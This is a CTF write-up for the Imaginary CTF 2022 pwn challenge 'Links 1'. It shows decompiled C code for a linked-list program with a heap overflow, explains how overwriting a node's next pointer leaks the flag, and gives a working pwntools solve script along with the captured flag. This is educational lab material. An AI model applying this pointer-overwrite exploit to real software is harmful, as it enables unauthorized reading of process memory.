---
name: Links 1 (2022)
event: Imaginary CTF 2022
category: Pwn
description: Writeup for Links 1 (Pwn) - Imaginary CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Links 1

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/COlJwjGq6nA/0.jpg)](https://www.youtube.com/watch?v=COlJwjGq6nA "Links 1")

## Description

> I love linked lists, but I can never remember the exact syntax how to implement them in C. Can you check over this implementation and make sure I didn't screw anything up?

**[download challenge binary](https://imaginaryctf.org/r/EA6oR#links1)**

## Source

#### Open flag

{% code overflow="wrap" %}
```c
void main(void)
{
  FILE *pFVar1;

  setbuf(stdout,(char *)0x0);
  pFVar1 = fopen("./flag.txt","r");
  __isoc99_fscanf(pFVar1,&DAT_004021b5,flag);
  do {
    menu();
  } while( true );
}
```
{% endcode %}

#### View elements in the linked list

{% code overflow="wrap" %}
```c
void view_list(void)
{
  long i;
  uint j;

  if (head == 0) {
    puts("No elements in list!\n");
  }
  else {
    j = 0;
    for (i = head; i != 0; i = *(long *)(i + 0x40)) {
      printf("%d: %s\n",(ulong)j,i);
      j = j + 1;
    }
    putchar(10);
  }
  return;
}
```
{% endcode %}

#### Write elements to the list

{% code overflow="wrap" %}
```c
ssize_t write(int __fd,void *__buf,size_t __n)
{
  int iVar1;
  undefined4 extraout_var;
  ssize_t sVar2;
  uint index;
  void *prev;
  int i;
  void *next;
  void *tail;
  void *element;

  puts("What element index would you like to write to?");
  printf("Valid values: 0 to %d, inclusive\n\n",(ulong)max_len);
  printf(">>> ");
  __isoc99_scanf(&DAT_004020b3,&index,&dead);
  if (((int)index < 0) || ((int)max_len < (int)index)) {
    iVar1 = puts("Invalid index!");
    sVar2 = CONCAT44(extraout_var,iVar1);
  }
  else {
                    /* add/modify head node */
    if (index == 0) {
      if (head == (void *)0x0) {
        head = malloc(0x48);
        max_len = max_len + 1;
      }
      sVar2 = write_data(head);
    }
    else {
                    /* add node to tail */
      if (index == max_len) {
        element = malloc(0x48);
                    /* set node pointer to null */
        *(undefined8 *)((long)element + 0x40) = 0;
        max_len = max_len + 1;
        tail = head;
                    /* traverse list, from head to tail */
        for (next = *(void **)((long)head + 0x40); next != (void *)0x0;
            next = *(void **)((long)next + 0x40)) {
          tail = next;
        }
                    /* set old tail to point to new tail */
        *(void **)((long)tail + 0x40) = element;
                    /* write data to the node */
        sVar2 = write_data(element);
      }
      else {
                    /* change node in middle */
        i = 1;
        prev = head;
                        /* set element to second node (first after head) */
        element = *(void **)((long)head + 0x40);
                        /* traverse list until we get to node index */
        while ((element != (void *)0x0 && ((int)i < (int)index))) {
          printf("i: %d, prev: %p, element: %p\n",(ulong)i,prev,element);
          prev = element;
          element = *(void **)((long)element + 0x40);
        }
                        /* update the node contents */
        printf("prev %p, element %p\n",prev,element);
        sVar2 = write_data(element);
      }
    }
  }
  return sVar2;
}
```
{% endcode %}

#### Write data to an element in the list

{% code overflow="wrap" %}
```c
void write_data(char *param_1)
{
  char *i;

  puts("What data do you want to write to this element?\n");
  printf(">>> ");
  fgets(param_1,100,stdin);
  for (i = param_1; *i != '\n'; i = i + 1) {
  }
  *i = '\0';
  return;
}
```
{% endcode %}

#### View time

{% code overflow="wrap" %}
```c
void view_time(void)
{
  system("date");
  return;
}
```
{% endcode %}

## Solution

The `write` function uses a custom linked list implementation and can be broadly broken down into three sections.

1. add/modify **head** element
2. add element to **tail**
3. modify element in the **middle**

When we add an element to the list, a 72-byte chunk is allocated from the heap with `malloc`.

{% code overflow="wrap" %}
```c
element = malloc(0x48);
```
{% endcode %}

The 72 byte element is structured like `[64:data, 8:pointer_to_next_element]`

The vulnerability arises when we write data to the node.

{% code overflow="wrap" %}
```c
fgets(param_1,100,stdin);
```
{% endcode %}

If we write more than the 64 intended bytes, we'll overflow the element and overwrite the pointer to the element in the list.

Since the flag is loaded into the `.bss` section by `main`

{% code overflow="wrap" %}
```c
pFVar1 = fopen("./flag.txt","r");
__isoc99_fscanf(pFVar1,&DAT_004021b5,flag);
```
{% endcode %}

We can easily find and submit the address of `bss.flag` (`0x4040c0`) after our 64 bytes of padding to overwrite the next element with the address of the flag. When we view the list, it will print the flag.

{% code overflow="wrap" %}
```sh
[!] 2: ictf{arbitrary_read_ftw_d52a23c3}
```
{% endcode %}

## Solve Script

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x401467
continue
'''.format(**locals())

# Binary filename
exe = './links1'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Add 3 elements to list (we need a first, middle and last node)
for i in range(3):
    io.sendlineafter(b'>>>', b'2')
    io.sendlineafter(b'>>>', str(i).encode())
    io.sendlineafter(b'>>>', b'CHUNK_' + str(i).encode())

# Modify element in list (middle node)
io.sendlineafter(b'>>>', b'2')
io.sendlineafter(b'>>>', b'1')
# Overwrite the link to point to flag
io.sendlineafter(b'>>>', (b'A' * 64) + flat(elf.symbols.flag))

# View list (flag hopefully)
io.sendlineafter(b'>>>', b'1')

# These our first two entries, unimportant
io.recvlines(2)

# We want the third entry, now pointing to the flag
warn(io.recvline().decode())
```
{% endcode %}
